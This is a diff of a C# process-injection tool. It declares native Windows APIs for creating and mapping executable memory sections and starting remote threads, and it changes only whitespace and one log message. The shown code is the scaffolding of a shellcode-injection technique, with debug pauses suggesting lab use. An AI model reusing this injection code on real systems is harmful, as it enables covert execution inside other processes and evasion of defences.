@@ -21,18 +21,25 @@ namespace Inject
 
         [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
         static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+        
         [DllImport("ntdll.dll", SetLastError = true)]
         static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out int ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+        
         [DllImport("ntdll.dll", SetLastError = true)]
         static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);     
+        
         [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
         static extern int NtClose(IntPtr hObject);
+        
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
         [DllImport("ntdll.dll", SetLastError = true)]
         public static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
+        
         [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
         public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
+        
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
@@ -80,8 +87,7 @@ namespace Inject
             // Create a new section.
             IntPtr sectionHandler = new IntPtr(); 
             long createSection = (int)NtCreateSection(ref sectionHandler, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,IntPtr.Zero,ref bufferLength,PAGE_EXECUTE_READWRITE,SEC_COMMIT,IntPtr.Zero);
-            Console.WriteLine("[+] New section was created");
-            Console.WriteLine("New Section address: " + createSection);
+            Console.WriteLine("[+] New section was created on processID: " + targetProcess[0].Id);
             Console.WriteLine("1st breakpoint. Press Enter to continue ...");
             Console.ReadLine();
 
